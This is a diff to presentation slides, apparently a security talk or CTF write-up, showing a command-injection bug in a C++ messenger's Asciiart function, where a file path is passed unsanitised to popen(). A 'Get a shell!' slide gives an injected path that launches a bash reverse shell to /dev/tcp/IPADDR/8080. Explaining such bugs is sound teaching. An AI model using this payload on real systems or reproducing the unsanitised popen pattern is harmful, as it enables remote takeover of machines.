@@ -181,8 +181,51 @@ void OnionMessenger::HandleAArt(Message::ImgLayer *msg) {
 <!-- .slide: data-background-transition="none" -->
 ---?image=assets/image/process6.png&size=60%
 <!-- .slide: data-background-transition="none" -->
-### We can exploit command injection with manipulated path 
+---?image=assets/image/process2.png&size=60%
+<!-- .slide: data-background-transition="none" -->
+
+---
+
+```C++
+    } else {		// Cache Hit                                                               
+        provider->PushChat(sender, "\n" + \
+            Features::Asciiart(elem->GetPath().c_str()));
+        image_cache->update(url);                                              
+    }
+```
+
+@[3](with manipulated path)
+
+---
+
+### Utils/Features.cc
+```C++
+string Asciiart(const char *filepath) {                                        
+    string path = "/root/bin/goasciiart " ;                                    
+    //string path = "/bin/go/bin/goasciiart ";                                 
+    string result= "";                                                         
+    path.append(" -p ").append(filepath).append(" -w 80");                     
+    char buf[1024];                                                            
+    FILE *fp=NULL;                                                             
+    cout << path << endl;                                                      
+    fp=popen((char*)path.c_str(),"r");                                         
+    if (fp) {                                                                  
+        while ((fgets(buf,1024,fp)) != NULL) {                                 
+            result.append(string(buf));                                        
+        }                                                                      
+        pclose(fp);                                                            
+    }                                                                          
+    return result;                                                             
+}                                  
+```
+@[5, 9](Command Injection)
+
+---                                                                          
 ### Get a shell!
+
+```C++
+popen(“/root/bin/goasciiart –p ;echo \"bash -i >& /dev/tcp/IPADDR/8080 0>&1\"  | bash;–w 80”);
+```
 
 ---
 
